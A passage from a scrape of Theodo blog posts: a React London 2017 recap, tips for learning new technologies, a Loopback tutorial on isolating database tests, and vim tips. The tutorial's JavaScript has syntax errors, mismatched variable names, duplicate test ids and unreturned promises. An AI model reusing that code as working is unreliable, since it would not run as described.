\t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tOn a breezy day in March, I, along with three other TheodoUK-ers, attended React London 2017. Standing in the stark light of the Westminster sun that silhouetted the brutalist architecture of the QEII Centre, we admired the conference\u2019s production value \u2013 check out that flag! But would we actually learn anything, or would it just be a day of beautiful typography and tasty canap\u00e9s? We silenced these self-indulgent musings and crossed the threshold into the El Dorado of front-end development.\nReact London 2017 flag, outside the QEII Centre. Photo by me.\nprettier\nYouTube/project\nAfter a light breakfast, we settled in for the first talk: prettier, a JavaScript pretty printer, by Facebook engineer Christopher Chedeau. prettier takes any JavaScript file and returns it perfectly formatted. You may have come up against the limitations of auto-formatting tools such as beautify or eslint. prettier improves on these because it can fix everything, even maximum line length violations (and their inverse, premature multi-line formatting). This is because it first parses the JavaScript into an abstract syntax tree, removing all existing formatting, and then pretty-prints the result (a technique based on a 1983 paper by Philip Wadler). Adding a pre-commit hook that runs prettier completely eliminates the need for all those annoying reformatting requests in code reviews \u2013 so called \u2018nits\u2019. Perhaps one day we will upload just abstract syntax trees to GitHub, then when we want to read them, render them to code using prettier with our own preferred syntax settings. Could this, once and for all, end the debate on semi-colons v. no semi-colons?\nlogux\nYouTube/project\nNext up was Andrey Sitnik, fresh (or perhaps lightly pickled, as he would be the first to admit) in from St Petersburg. He is the creator of logux, a \u201cnew approach to client-server communication\u201d. Inspired by concepts from swarm.js (a \u201cgeneral-purpose isomorphic database that runs simultaneously on the server and client\u201d), logux is essentially the love child of Meteor and Redux. Instead of implementing your own AJAX/REST client-server communications, redux actions are automatically synchronised between the two, thereby keeping their states identical. This eliminates a huge amount of overhead when building apps for the web, meaning more time for vodka \u2026errrr I mean \u2018business logic\u2019. Sounds good to me.\nComplexity curve with AJAX/the world before logux, from Andrey\u2019s slides.\nReason\nYouTube/project\nLadies and gentlemen, hold on to the edge of your seats, we now enter the s t r a n g e world of functional programming.\nReason is a new syntax layer and toolchain for OCaml, a powerful multi-paradigm language derived from ML (functional heaven). Reason is the past (the first version of React was written in SML, aka OCaml\u2019s cousin) and the future, of React. It resembles a typed subset of modern JavaScript, making it easy for frontend developers to jump in and start flexing their functional muscles.\nFunctional muscles. From T nation.\nReason compiles to both JavaScript and native code \u2013 Facebook uses it in production on both the frontend and backend. Cheng Lou, of Facebook, presented a compelling introduction to Reason from first principles. What makes an ideal programming language? What if we can push all the meta language \u2013 modules, files, tests, documentation, package management \u2013 down into the language itself, to make expressing and reasoning about it much easier? A practical example: Reason introduces the concept of modules. These are named, scoped blocks of code that can contain anything that an OCaml/Reason file can. Files and modules map to each other semantically: a file containing multiple modules is equivalent to a folder of files.\n\n/* school.re */\r\n\r\nmodule Teachers = {...};\r\nmodule Rooms = {...};\r\nmodule Students = {\r\n  ...\r\n  module Agendas = {...};\r\n  ...\r\n};\r\n\n\nA Reason file, school.re, containing nested modules, equivalent to a filesystem.\nHaving \u2018first class\u2019 files (modules can be nested, and even passed to and returned from functions) means things like code generation, module typing, module encapsulation and module abstraction can be pushed from the meta level back down into the language itself. If a language can reach a level of maturity where all the boilerplate has been absorbed into the syntax, we could theoretically be left to only write application specific code.\nA shocked boilerplate. From Boilerplate.\nWith lunch (delicious noodles by Leith\u2019s) swiftly approaching, we had a series of 10 minute Lightning Talks, on topics from snapshot testing with Jest to offline-first React and ReactNative development. Then, the Feeding began.\nFeeding Frenzy. From Feeding Frenzy 2, by PopCap.\nstyled-components\nYouTube/project\nHello. Yes, YOU there. Have you ever styled a React Component using CSS? Ever noticed that you are defining single-use classes, in other words there is a one to one mapping between your CSS classes and components? styled-components enforces better practices by removing that mapping. Instead, you style the components themselves.styled-components uses a vanilla ES6 feature, tagged template literals, to drive its syntax. It solves the lack of proper CSS scoping and promotes better designed \u2018style interfaces\u2019 to your components, by encouraging the use of props to change your components\u2019 styles, just as you would do to change their behaviours. This is preferable to manually applying CSS classes (via className), which are actually just implementation detail.\nstyled-components also introduces themes, a workaround for when you do want to apply CSS globally. The main problem with styled components seems to be the lack of standard naming conventions in themes. A standard would allow instant plug and play with third party components, but has not yet been established \u2013 for now, you need to look at the component\u2019s implementation to ensure it correctly observes your theme.\nThe speaker, Max Stoiber, also took the opportunity to debut Polished.js, a \u201clightweight toolset for writing styles in JavaScript\u201d. Think underscore.js, but for styles. Rather than being a CSS framework like Bootstrap, Polished.js provides Sass-style utility functions and mixins, making the switch from a CSS pre-processor to styling in JS super easy.\nReact Fiber\nYouTube/project\nReact is capable of rendering to more environments than just the browser. You have probably heard of ReactNative, but what about ReactVR, ReactBlessed (terminal UIs!) and ReactHardware? A key process in React is reconciliation, the internal \u2018diffing\u2019 algorithm that compares one tree with another to determine which parts need rerendering. React\u2019s ability to render to multiple different environments was made possible by reconciliation and rendering being seperate processes. In fact, internally, React comes in two halves \u2013 the core and the renderers. Each different environment can supply its own renderer, whilst sharing the same core reconciler. React\u2019s current reconciler is called Stack; its upcoming successor, 2 years in the making, is Fiber.\nStack (left) v Fiber (right) performance comparison \u2013 rendering hundreds of components in a Sierpinski triangle. See the live version here.\nThe primary goal with Fiber is speed \u2013 it achieves this by introducing scheduling, the process of determining when work should be performed. Rendering tasks are assigned relative priorities and can then be prioritised, delayed or aborted as required. This gives huge UI performance gains for dynamic UIs and animations. Fiber isn\u2019t ready quite yet, but as it is already promising complete backwards-compatibility, it\u2019s definitely something to look forward to.\nDustan Kasten, the speaker, then did a code walkthrough of a custom renderer he had written using the new Fiber renderer official API.\nWatch this amazing talk (recommended by Dustan), or read this overview, for more.\nPanel\nYouTube\nNext we had the React panel discussion with four Facebook engineers: Ben Alpert, Dan Abramov (creator of Redux, CreateReactApp, ReactHotLoader), Lee Byron and Christopher Chedeau. They addressed the two most important questions for every React developer:\n\nShould you put everything in your redux store, or just app state (i.e. not UI state)? Spoiler: do what makes sense for you and your app.\nWho would win a fight between Mark Zuckerberg & this panel? They said the Zuck \u2013 terrifying.\n\nLet the hacking begin \u2013 the Zuck. From Democratic Underground.\nWeapons grade React\nYouTube\nThe closing talk, Weapons grade React, was by American brogrammer and CEO of Wheeler Defense Systems (disclaimer: this is not a real company), Kenny Wheeler. Despite difficulties with UK customs, Kenny had imported his ReactHardware-powered, car-mounted robot crossbow, named CrossBro. Controlling it with a ReactNative mobile app, he proceeded to perform target practice on his company\u2019s latest hire (ok, it was a Nerf  crossbow).\nA picture says a thousand words, or something. From Kenny Wheeler\u2019s presentation.\nReact London 2017 was an incredible experience. The maturity of frontend engineering, with amazing technologies emerging all the time, shows what an exciting time it is to be a web developer.\nDIY Theodo.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tJack Lawrence-Jones\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nAs a developer, I find exciting and captivating to discover a new technology or to learn a new language. But how to do it effectively? \nHere are few tips you can try when beginning a project on a new technology :\n\nUnderstand the structure: learning how functionalities and roles are separated and work together will help you to know how to add functionalities and where in your project. If you can highlight the architectural patterns and understand on which one the technology is built, you will really see the structure of it.\u00a0\nLearn how to write properly\u00a0what you want to implement. You can \u00a0check some previous PR of another project working on the same technology. That way, you will see how to add your own contribution to the structure.\nIdentify the ninjas:\u00a0Wether they are part of your company\u00a0or someone to follow online, identify the experts in the technology you want to master. You will benefit from their knowledge.\nBe curious: do not let dark areas you do not know in your project. Try to have a good overview of all your project without going into details. Many technologies have well structured tree project. Even if you don\u2019t use some parts of the project they are here for a reason. Do not hesitate to ask your teammates, they know things !\nFind a mentor:\u00a0if you\u2019re lucky enough to know people\u00a0more experienced, don\u2019t hesitate to pair-program with them. That way you will understand how they\u00a0think this technology and how they\u00a0handle the constraints of it.\nDraw the data flow: when you start to have a good idea of how your project is built, try to draw the data flow of what come in and out of your project. By doing so, you will understand how your program reacts to an event or a user input.\nUse a debugger:\u00a0a debugger will allow you to stop your program almost everywhere and to check the state of the data that is being processed. You can run your program instructions by instructions, understanding what truly does your code.\nRead unit tests: \u00a0unit tests are meant to validate that each step of your software worked as designed. You will see what each part is supposed to have as input and what it is expected to return.\nWrite automated tests:\u00a0writing automated tests will help you greatly to understand how the code you write works and also what it\u00a0needs to be able to work correctly.\nMake your code crash: this may seem odd, but when you just finished a new functionality, try to make it endure different inputs. You will see the full potential of what you just wrote, and if it crashes, ask yourself why and try to understand the limits of the mechanisms you used. You will learn about the side effects of the technology and its assets. The best way to do so is to write unit tests, because it allows you to test each part of your code separately.\n\nHere are some articles that helped me discover new technologies on my projects:\nRedux (thanks Nicolas Boutin for these amazing articles ;))\n\nYou might not need Redux\n\n\nA cartoon intro to Redux\n\n\nSagas in Redux\n\nSymfony\n\nThe big picture\n\n\nConfigure Xdebug and PhpStorm for a Vagrant project in 5 minutes\n\nJavascript\n\nKeep calm and love Javascript unit test\n\n\u00a0\nFeel free to add your own gold nuggets articles \ud83d\ude09\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tCharles Parent\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tHere is what I learnt while testing backend calls to the database on a project using node.js with Loopback and a PostgreSQL database though this article would apply to any technology.\nBasically, it all goes back to saying that each test should have full power over its data. Each test must ensure its independence by cleaning the database first and then defining its own dataset according to its needs.\nAll tests should start by cleaning the database\nWhen testing a function that reads or writes in the database, it is crucial that you know exactly what data it contains. This means that you should setup the dataset yourself and not rely on any previous data it may contain. This also means you need to clean the database before putting any test data in the database.\nIn our project, we used to clean the data at the end of each test thinking this was a good way to make our tests independent. However, making the assumption of a clean database is nothing else but making all tests dependent. This is actually a bad practice because a test could break because another test changed.\nAs a matter of fact, we forgot to clean the database after a few tests. As a consequence, other tests that were executed afterwards were failing randomly depending on the order of execution. We would relaunch all tests until they all passed\u2026 Then we moved the cleaning of the database at the beginning of the tests so that each test was responsible for its independence. The result of each test became consistent as they would pass or fail always in the same way across executions.\nYes some tests did fail after that. This highlighted the fact that they were poorly written, which leads me to my second point.\nAll tests should define their own test data\nAt the risk of repeating myself, it should be clear what data you have in your database at the beginning of a test. Otherwise, your tests will not be easily maintainable.\nIn our project, we used to update a common set of data and load it for each test.\nWe soon faced two problems:\n\nBy adding, removing, or updating data, we would break other tests or worse make them useless without breaking. For instance, take a function that filters an array of objects depending on some condition. Your test array has two entries: one that will be kept, one that will be removed. If you remove the entry that should have been removed, the test still passes, but becomes useless.\nWhen updating a function, we had to retro-engineer the dataset to find the new result of the test. Indeed, the common dataset was not made to give us useful data. It contained more useless data than useful data.\n\nWhen it became impossible to update this common dataset, we decided to define an entire new set of data for each new test. This takes time and requires more lines of code, but eventually made us more efficient. We were able to write more tests in the same amount of time and thus write tests for more cases.\nIds of test data should be hard-coded\nYou want to make your data as easy to use as possible. Fetching data by id will simplify your tests and make them more readable.\nWe were not doing this on our project because alls ids were auto-incremented by the database. Consider for instance two persons whose names are \u2018Person A\u2019 and \u2018Person B\u2019. We want to check that Person A gave 100\u20ac to Person B. If we don\u2019t know the ids for personA, personB, bankAccountA and bankAccountB, here is what the test could look like using Loopback.\n// In transfer.test.js\r\nit('should transfer 100 euros', function(done) {\r\n  var accountAId, accountBId;\r\n  cleanDatabase()\r\n  .then(function() {\r\n    return Promise.all([\r\n      Person.create({name: 'Person A'}),\r\n      Person.create({name: 'Person B'})\r\n    ]);\r\n  })\r\n  .then(function(createdPersons) {\r\n    var personAId = createdPersons[0].id;\r\n    var personBId = createdPersons[1].id;\r\n    return Promise.all([\r\n      BankAccount.create({personId: personAId, amount: 100}),\r\n      BankAccount.create({personId: personBId, amount: 0})\r\n    ]);\r\n  })\r\n  .then(function(createdAccounts) {\r\n    accountAId = createdAccounts[0].id;\r\n    accountBId = createdAccounts[1].id;\r\n    return transfer('Person A', 'Person B', 100);\r\n  })\r\n  .then(function() {\r\n    return Promise.all([\r\n      BankAccount.findById(accountAId),\r\n      BankAccount.findById(accountBId)\r\n    ]);\r\n  })\r\n  .then(function(fetchedAccounts) {\r\n    expect(fetchedAccounts[0].amount).toEqual(0);\r\n    expect(fetchedAccounts[1].amount).toEqual(100);\r\n    return done();\r\n  })\r\n  .catch(done);\r\n});\r\n\nNow, if you hard-code ids, here is what this test might look like:\n// In transfer.test.js\r\nit('should transfer 100 euros', function(done) {\r\n  cleanDatabase()\r\n  .then(function() {\r\n    return Promise.all([\r\n      Person.create({id: 1, name: 'Person A'}),\r\n      Person.create({id: 2, name: 'Person B'})\r\n    ]);\r\n  })\r\n  .then(function() {\r\n    return Promise.all([\r\n      BankAccount.create({id: 1, personId: 1, amount: 100}),\r\n      BankAccount.create({id: 2, personId: 2, amount: 0})\r\n    ]);\r\n  })\r\n  .then(function() {\r\n    return transfer('Person A', 'Person B', 100);\r\n  })\r\n  .then(function() {\r\n    return Promise.all([\r\n      BankAccount.findById(1),\r\n      BankAccount.findById(2)\r\n    ]);\r\n  })\r\n  .then(function(fetchedAccounts) {\r\n    expect(fetchedAccounts[0].amount).toEqual(0);\r\n    expect(fetchedAccounts[1].amount).toEqual(100);\r\n    return done();\r\n  })\r\n  .catch(done);\r\n});\r\n\nWhat we would love to write is actually this:\n// In transfer.test.js\r\nit('should transfer 100 euros', function(done) {\r\n  // Setup data\r\n  var data = {\r\n    Person: [\r\n      {id: 1, name: 'Person A'},\r\n      {id: 2, name: 'Person B'}\r\n    ],\r\n    BankAccount: [\r\n      {id: 1, personId: 1, amount: 100},\r\n      {id: 2, personId: 2, amount: 0}\r\n    ]\r\n  };\r\n  cleanDatabase()\r\n  .then(function() {\r\n    feedDatabase(data);\r\n  })\r\n  .then(function() {\r\n    return transfer('Person A', 'Person B', 100);\r\n  })\r\n  .then(function() {\r\n    return Promise.all([\r\n      BankAccount.findById(1),\r\n      BankAccount.findById(2)\r\n    ]);\r\n  })\r\n  .then(function(fetchedAccounts) {\r\n    expect(fetchedAccounts[0].amount).toEqual(0);\r\n    expect(fetchedAccounts[1].amount).toEqual(100);\r\n    return done();\r\n  })\r\n  .catch(done);\r\n});\r\n\nThe feedDatabase function needs to fill table Person before table BankAccount in order to avoid a foreign key constraint violation error on table BankAccount for constraint personId. We write this feedDatabase function in a module that will be common to all tests.\n// In common/test_setup.js\r\nconst FEED_ORDER = [\r\n  ['Person'],\r\n  ['BankAccount']\r\n];\r\n\r\nvar feedDatabaseInOrder = function(index, app, data) {\r\n  var line, modelInsertions, modelName;\r\n  if (index === FEED_ORDER.length) {\r\n    return;\r\n  }\r\n  modelInsertions = [];\r\n  for (modelName of FEED_ORDER[index]) {\r\n    if (data.hasOwnProperty(modelName)) {\r\n      for (line of data[modelName]) {\r\n        modelInsertions.push(app.models[modelName].create(line));\r\n      }\r\n    }\r\n  }\r\n  Promise.all(modelInsertions).then(function() {\r\n    return feedDatabaseInOrder(index + 1, app, data);\r\n  });\r\n};\r\n\r\nvar feedDatabase = function(app, data) {\r\n  return feedDatabaseInOrder(0, app, data);\r\n};\r\n\nNote that feedDatabase needs to be given app which is the application instance.\nImprovement 1: using a data initializer\nLet\u2019s improve our example above. Each bank account needs to belong to a bank.\nTo satisfy this constraint, our data in the test needs to look like:\nvar data = {\r\n  Bank: [\r\n    {id: 1, name: 'Bank 1', country: 'France', authorizationNumber: '123'}\r\n  ],\r\n  Person: [\r\n    {id: 1, name: 'Person A'},\r\n    {id: 2, name: 'Person B'}\r\n  ],\r\n  BankAccount: [\r\n    {id: 1, personId: 1, bankId: 1, amount: 100},\r\n    {id: 1, personId: 2, bankId: 1, amount: 0}\r\n  ]\r\n};\r\n\nWe also need to add the Bank model to FEED_ORDER in the common module:\n// In common/test.setup.js\r\nconst FEED_ORDER = [\r\n  ['Person', 'Bank'],\r\n  ['BankAccount']\r\n];\r\n\nHowever, the bank to which the bank accounts belong has no impact on our transfer function. We would like to keep in the test only what is meaningful.\nIn another common file, let\u2019s define a data initializer. It should contain no business data but a default value for each model with id 1 by convention. The initializer is not meant to be used as test data. Its aim is only to help satisfy foreign key constraints.\n// In common/data_initializer.js\r\n\r\nconst DATA_INITIALIZER = {\r\n  Bank = [\r\n    {id: 1, name: 'Bank 1', country: 'France', authorizationNumber: '123'}\r\n  ],\r\n  BankAccount: [\r\n    {id: 1, personId: 1, bankId: 1, amount: 1}\r\n  ],\r\n  Person: [\r\n    {id: 1, name: 'Person A'}\r\n  ]\r\n};\r\n\r\nvar getDefaultData = function() {\r\n  // This clones DATA_INITIALIZER so that it cannot be altered\r\n  return JSON.parse(JSON.stringify(DATA_INITIALIZER));\r\n};\r\n\nIn our test, we can now write:\nvar data = getDefaultData()\r\ndata.BankAccount = [\r\n  {id: 1, personId: 1, bankId: 1, amount: 100},\r\n  {id: 1, personId: 2, bankId: 1, amount: 0}\r\n];\r\ndata.Person = [\r\n  {id: 1, name: 'Person A'},\r\n  {id: 2, name: 'Person B'}\r\n];\r\n\nIt\u2019s important that you override BankAccount and Person to be able to see all useful data within the test itself and not be dependent on default values such as the default bank account amount.\nImprovement 2: resetting id sequences\nWhen hard-coding ids as we did, any further attempt to insert a new entry in the database without hard-coding its id will fail. Indeed, while we inserted data with hard-coded ids, the id sequences were never updated. The database will automatically try to insert the new entry with id 1, which is already used.\nThe best way to deal with this problem is to reset the id sequence manually. The most transparent is probably to restart the id sequence at the max id of all inserted rows.\n// In common/test_setup.js\r\n\r\nvar updateIdSequences = function(app) {\r\n  var datasourceConnector, table, tables, updates;\r\n  datasourceConnector = app.models[FEED_ORDER[0][0]].dataSource.connector;\r\n  updates = [];\r\n\r\n  for (tables of FEED_ORDER) {\r\n    for (table of tables) {\r\n\r\n      var tableName = table.toLowerCase();\r\n      var sequence = tableName + '_id_seq';\r\n\r\n      updates.push(new Promise(function(resolve, reject) {\r\n        var findMaxIdQuery = 'SELECT MAX(id) FROM ' + table + ';';\r\n\r\n        return datasourceConnector.query(findMaxIdQuery, [], getCallback(sequence, dataSourceConnector, reject, resolve));\r\n      }));\r\n    }\r\n  }\r\n  return Promise.all(updates);\r\n};\r\n\r\nfunction getCallback = (sequence, dataSourceConnector, reject, resolve) {\r\n  return function (err1, res) {\r\n    if (err1) { return reject(err1); }\r\n\r\n    if (res[0].max != null) {\r\n      var updateIdSequenceQuery = 'ALTER SEQUENCE ' + sequence + ' RESTART WITH ' + (res[0].max + 1) + ';';\r\n\r\n      return datasourceConnector.query(updateIdSequenceQuery, [], function(err2) {\r\n        if (err2) { return reject(err2); }\r\n        resolve();\r\n      });\r\n    } else {\r\n      resolve();\r\n    }\r\n  };\r\n}\r\n\r\nvar feedDatabase = function(app, data) {\r\n  return feedDatabaseInOrder(0, app, data)\r\n  .then(function() {\r\n    // ------------> update all id sequences\r\n    updateIdSequences(app);\r\n  });\r\n};\r\n\nImprovement 3: debugging the feedDatabase function\nWhen using the feedDatabase function, I once had trouble understanding a bug in one of my tests. I had forgotten to add the new model I had just created to the FEED_ORDER constant. I made a small change to feedDatabase in order to count the number of inserted models. The function now returns an explicit error when one model of data has not been used.\n// In common/test_setup.js\r\nvar feedDatabaseInOrder = function(index, app, data, countInsertedModels) {\r\n  var line, modelInsertions, modelName;\r\n  if (index === FEED_ORDER.length) {\r\n    return;\r\n  }\r\n  modelInsertions = [];\r\n  for (modelName of FEED_ORDER[index]) {\r\n    if (data.hasOwnProperty(modelName)) {\r\n\r\n      // ------------> increment model count\r\n      countInsertedModels++;\r\n\r\n      for (line of data[modelName]) {\r\n        modelInsertions.push(app.models[modelName].create(line));\r\n      }\r\n    }\r\n  }\r\n  Promise.all(modelInsertions).then(function() {\r\n    return feedDatabaseInOrder(index + 1, app, data, countInsertedModels);\r\n  });\r\n};\r\n\r\nvar feedDatabase = function(app, data) {\r\n  return feedDatabaseInOrder(0, app, data, 0)\r\n  .then(function(countInsertedModels) {\r\n    // ------------> throw error if counts don't match\r\n    if(countInsertedModels != Object.keys(data).length) {\r\n      throw new Error('Some model forgotten in FEED_ORDER in common/test_setup.js');\r\n    }\r\n  })\r\n  .then(function() {\r\n    updateIdSequences(app);\r\n  });\r\n};\r\n\nWhat we get in the end\n\ncommon/test_setup.js\n\nconst FEED_ORDER = [\r\n  ['Person', 'Bank'],\r\n  ['BankAccount']\r\n];\r\n\r\nvar feedDatabaseInOrder = function(index, app, data, countInsertedModels) {\r\n  var line, modelInsertions, modelName;\r\n  if (index === FEED_ORDER.length) {\r\n    return;\r\n  }\r\n  modelInsertions = [];\r\n  for (modelName of FEED_ORDER[index]) {\r\n    if (data.hasOwnProperty(modelName)) {\r\n      countInsertedModels++;\r\n\r\n      for (line of data[modelName]) {\r\n        modelInsertions.push(app.models[modelName].create(line));\r\n      }\r\n    }\r\n  }\r\n  Promise.all(modelInsertions).then(function() {\r\n    return feedDatabaseInOrder(index + 1, app, data, countInsertedModels);\r\n  });\r\n};\r\n\r\nvar updateIdSequences = function(app) {\r\n  var datasourceConnector, table, tables, updates;\r\n  datasourceConnector = app.models[FEED_ORDER[0][0]].dataSource.connector;\r\n  updates = [];\r\n\r\n  for (tables of FEED_ORDER) {\r\n    for (table of tables) {\r\n\r\n      var tableName = table.toLowerCase();\r\n      var sequence = tableName + '_id_seq';\r\n\r\n      updates.push(new Promise(function(resolve, reject) {\r\n        var findMaxIdQuery = 'SELECT MAX(id) FROM ' + table + ';';\r\n\r\n        return datasourceConnector.query(findMaxIdQuery, [], getCallback(sequence, dataSourceConnector, reject, resolve));\r\n      }));\r\n    }\r\n  }\r\n  return Promise.all(updates);\r\n};\r\n\r\nfunction getCallback = (sequence, dataSourceConnector, reject, resolve) {\r\n  return function (err1, res) {\r\n    if (err1) { return reject(err1); }\r\n\r\n    if (res[0].max != null) {\r\n      var updateIdSequenceQuery = 'ALTER SEQUENCE ' + sequence + ' RESTART WITH ' + (res[0].max + 1) + ';';\r\n\r\n      return datasourceConnector.query(updateIdSequenceQuery, [], function(err2) {\r\n        if (err2) { return reject(err2); }\r\n        resolve();\r\n      });\r\n    } else {\r\n      resolve();\r\n    }\r\n  };\r\n}\r\n\r\nvar feedDatabase = function(app, data) {\r\n  return feedDatabaseInOrder(0, app, data, 0)\r\n  .then(function(countInsertedModels) {\r\n    if(countInsertedModels != Object.keys(data).length) {\r\n      throw new Error('Some model forgotten in FEED_ORDER in common/test_setup.js');\r\n    }\r\n  })\r\n  .then(function() {\r\n    updateIdSequences(app);\r\n  });\r\n};\r\n\n\ncommon/data_initializer.js\n\nconst DATA_INITIALIZER = {\r\n  Bank = [\r\n    {id: 1, name: 'Bank 1', country: 'France', authorizationNumber: '123'}\r\n  ],\r\n  BankAccount: [\r\n    {id: 1, personId: 1, bankId: 1, amount: 1}\r\n  ],\r\n  Person: [\r\n    {id: 1, name: 'Person A'}\r\n  ]\r\n};\r\n\r\nvar getDefaultData = function() {\r\n  // This clones DATA_INITIALIZER so that it cannot be altered\r\n  return JSON.parse(JSON.stringify(DATA_INITIALIZER));\r\n};\r\n\n\ntransfer.test.js\n\nit('should transfer 100 euros', function(done) {\r\n  // Setup data\r\n  var data = getDefaultData()\r\n  data.BankAccount = [\r\n    {id: 1, personId: 1, bankId: 1, amount: 100},\r\n    {id: 1, personId: 2, bankId: 1, amount: 0}\r\n  ];\r\n  data.Person = [\r\n    {id: 1, name: 'Person A'},\r\n    {id: 2, name: 'Person B'}\r\n  ];\r\n\r\n  cleanDatabase()\r\n  .then(function() {\r\n    feedDatabase(app, data);\r\n  })\r\n  .then(function() {\r\n    return transfer('Person A', 'Person B', 100);\r\n  })\r\n  .then(function() {\r\n    return Promise.all([\r\n      BankAccount.findById(1),\r\n      BankAccount.findById(2)\r\n    ]);\r\n  })\r\n  .then(function(fetchedAccounts) {\r\n    expect(fetchedAccounts[0].amount).toEqual(0);\r\n    expect(fetchedAccounts[1].amount).toEqual(100);\r\n    return done();\r\n  })\r\n  .catch(done);\r\n});\r\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tGireg de Kerdanet\r\n  \t\t\t\r\n  \t\t\t\tWeb developer at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nkbd {\n  display: inline-block;\n  padding: 3px 5px;\n  font-size: 11px;\n  line-height: 10px;\n  color: #555;\n  vertical-align: middle;\n  background-color: #fcfcfc;\n  border: solid 1px #ccc;\n  border-bottom-color: #bbb;\n  border-radius: 3px;\n  box-shadow: inset 0 -1px 0 #bbb\n}\n\nSometimes, you have to ssh on a server to fix some configuration files or to test a feature that you cannot test locally. You don\u2019t have your favourite text editor with all your configuration here.\nMost of the time, you have to rely on vim or nano in this situation.\nYour coworkers told you that nano is for newbies and you want to gain some street credibility, so you use vim.\n\nYour beard is not long enough for emacs.  You wouldn\u2019t be here anyway\nHere is a guide to help you solve the annoying problems that you may face with vim.\nWhen you forget to sudo\nYour server has a configuration issue, and you have to fix the configuration file, so you go vim <path-to-your-config-file>.\nYou make a bunch of changes, Esc:x to save the file and exit and then:\nE505: \"<your-config-file>\" is read-only (add ! to override)\nYou forgot about the sudo and now you think you have to drop your changes, and open vim again with sudo this time.\n\nFortunately, there is a solution: :w !sudo tee %\nLet\u2019s analyse this command:\n\n\n:w doesn\u2019t write in your file in this case. If you are editing file1 with vim and type :w file2, you will create a new file named file2 with your buffer and file1 will be left untouched.\nHere, you write to the \u201cfile\u201d !sudo tee %.\n\n\n!sudo: The bang ! lets you execute a command as if you were in a shell, in this case sudo to get superusers rights.\n\n\ntee sounds like the letter T for a reason: it acts like a T-shaped pipe. It takes a filename in argument, and redirects the output to the file you gave it and to the standard output.\n\n\n% refers to the current file in vim.\n\nYou now have the full equation: :w writes the buffer into tee (with superuser rights) that redirects the buffer into the current file (and to the standard output, but that\u2019s not useful here)\n\n\nPastemode\nWhat\u2019s more frustrating than pasting a snippet of code and having your formatting all messed up, especially in languages like Python where indentation is part of your code?\nExample:\n\nYou can switch to paste mode which allows you to paste text as is.\nSimply type :set paste in normal mode and then you\u2019re good to go (do not forget to switch to insert mode before pasting). Look carefully, everything happens on the last line of the video.\n\nYou might wonder: why not stay in paste mode all the time? Well it changes some of the configurations of vim like smarttabs and smartindent.\nHowever, if you have a lot of copy / pasting to do, you can use set pastetoggle=<F2> to set a toggle. Pressing F2 will switch paste mode on and off. You can replace F2 with any key you like. More info with :help paste.\nSearching for text\nChances are that you will look for something in the file you are trying to edit.\nIn normal mode simply type /<your-search>.\nIt will highlight text that matches and you can press n to go to the next or N to go to the previous occurrence.\nNotice how the text is left highlighted even after you entered insert mode? You can stop the highlighting by typing :noh as in \u201cno highlight\u201d.\n\nBlock comment\nSometimes, you have to test your file with a part of the code removed and the quickest way to do this without losing it is to comment it.\nTo comment multiple lines at once, simply put the cursor on the first column by pressing 0 at the top (or bottom) of the block you want to comment and press Ctrl + v\nYou are now in visual block mode where you can select a bloc of text, in our case a column. Go down or up and select the lines you want to comment. Press Shift + I and insert your programming language comment symbol. It will only print on the highest row selected. Then press Esc Esc and boom, your lines are commented!\nPress u to cancel the change, or simply bloc select it again and press x.\n\nIndent\nPress v to select text and then press  <  or  >  to indent in either direction. You can combine it with navigation actions. For example  >   G  will indent all lines from the cursor to the end of the file.\n\nHowever, it will indent your file of shiftwidth spaces. By default this value is 8 and that is quite big. You can use :set shiftwidth=<your-value> to adapt it to the indent style of your file.\nBonus: quick navigation\n\n$ goes to end of line\n0 goes to the beginning of the line (column 1) while ^ goes to the first non blank character\ngg goes to the top of the file while G goes to the bottom\n% goes to the matching parenthesis/bracket\nCtrl + F goes one page down and Ctrl + B goes one page up (think forward and backward to remember it)\nu cancels your last action and Ctrl + r reapplies it\n\nI hope this article made Vim less painful.\nYou can share your tips in the comments.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAlexandre Chaintreuil\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
